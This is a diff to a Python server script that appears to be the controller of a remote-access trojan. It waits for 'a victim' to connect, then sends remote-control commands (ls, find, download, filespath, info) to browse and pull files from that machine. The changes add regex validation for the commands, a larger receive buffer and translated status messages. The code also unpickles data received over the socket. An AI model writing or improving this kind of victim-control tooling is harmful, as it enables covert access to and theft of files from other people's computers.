@@ -1,5 +1,6 @@
 import os
 import pickle
+import re
 from socket import *
 import platform
 import time
@@ -27,6 +28,16 @@ def clearScreen():
         system("clear")
 
 
+
+def regexcheck_find(comando):
+    windows_regex='^find \.[a-z]{1,4} (\.(\\[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\\[a-zA-Z0-9, ,\_,\-]+)+)'
+    unix_regex='^find \.[a-z]{1,4} (\.(\/[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\/[a-zA-Z0-9, ,\_,\-]+)+)'
+
+    if re.match(unix_regex,comando) or re.match(windows_regex,comando):
+        return True
+    return False
+
+
 # OK gestisce il ctrl-C per l'uscita
 def signalHandler(signum, frame):
     msg = "Uscita effettuata con successo"
@@ -41,7 +52,7 @@ def serverConnection():
         server.bind(ADDR)
         server.listen(5)
         print()
-        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Server starting...", colour="green", ncols=50,
+        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Starting the server...", colour="green", ncols=50,
                       bar_format="{desc}: {percentage:3.0f}% {bar}"):
             sleep(0.2)
         print(f"[LISTENING] The Sever is waiting for a victim...\n")
@@ -95,8 +106,8 @@ def printInformazioni(clientConnection, addr):
             print("\n"+ buff)
             fileLog=fileLog+"\n"+buff+"\n"
 
-            print(f"[RECEIVING] Informazioni ricevute\n")
-            fileLog = fileLog + "\n" + f"[RECEIVING] Informazioni ricevute\n" + "\n"
+            print(f"\n[DONE] Info received.\n")
+            fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"
 
             if buff[0:6]=="[PATH]":
                 return buff
@@ -142,6 +153,14 @@ def filespath(clientConnection):
         print("Filespath non riuscito\n")
 
 
+def regexcheck_ls(comando):
+    windows_regex = '^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\\[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\\[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'
+    unix_regex = '^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\/[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\/[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'
+
+    if re.match(unix_regex,comando) or re.match(windows_regex,comando):
+        return True
+    return False
+
 # CONTROLLO REMOTO
 def remoteControl(clientConnection,buff):
     while True:
@@ -178,13 +197,20 @@ def remoteControl(clientConnection,buff):
 
 
             elif comando[0:2] == "ls":
+                match= regexcheck_ls(comando)
+                if match:
 
-                listdir = pickle.loads(clientConnection.recv(1024))
+                    try:
+                        listdir = pickle.loads(clientConnection.recv(9000))
 
-                for item in listdir:
-                    print("-: " + item)
+                        for item in listdir:
+                            print("-: " + item)
 
-                    fileLog = fileLog + "\n" + "-: " + item + "\n"
+                            fileLog = fileLog + "\n" + "-: " + item + "\n"
+                    except:
+                        print("\nAn error occurred, try again\n")
+                else:
+                    print("\nError, incorrect command")
 
             elif comando[0:8] == "download":
                 try:
@@ -224,34 +250,39 @@ def remoteControl(clientConnection,buff):
             elif comando[0:9] == "filespath":
                 filespath(clientConnection)
 
-            elif comando[0:4] == "find" and len(comando)>4:
+            elif comando[0:4] == "find":
 
-                for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                    sleep(0.2)
-                print("Attendi...")
-                filesize = clientConnection.recv(1024).decode(FORMAT)
+                match = regexcheck_find(comando)
 
-                dato = ('').encode(FORMAT)
-                try:
-                    dato = dato + clientConnection.recv(int(filesize))
-                    print(dato.decode(FORMAT))
-                    fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
-                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green",
-                                  ncols=50,
-                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                if match:
+
+                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
                         sleep(0.2)
-                except:
-                    traceback.print_exc()
-                    fileLog = fileLog + "\n" + "Find non eseguito correttamente\n"
-                    print("Find non eseguito correttamente\n")
+                    print("Attendi...")
+                    filesize = clientConnection.recv(1024).decode(FORMAT)
 
+                    dato = ('').encode(FORMAT)
+                    try:
+                        dato = dato + clientConnection.recv(int(filesize))
+                        print(dato.decode(FORMAT))
+                        fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
+                        for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green",
+                                      ncols=50,
+                                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                            sleep(0.2)
+                    except:
+                        traceback.print_exc()
+                        fileLog = fileLog + "\n" + "Find non eseguito correttamente\n"
+                        print("Find non eseguito correttamente\n")
+                else:
+                    print("Comando errato!")
             elif comando == "clear":
                 clearScreen()
 
             elif comando == "help":
                 commandsHelp()
 
-            elif comando == "cd .." or comando == "cd":
+            elif comando[0:2] == "cd":
                 pass
 
             elif comando == "info":
@@ -321,7 +352,7 @@ def main():
                 global fileLog
                 fileLog = fileLog + "\n" + f"[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"
 
-                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Ricezione informazioni...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Waiting for OS Info...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                     sleep(0.2)
 
                 buff=""
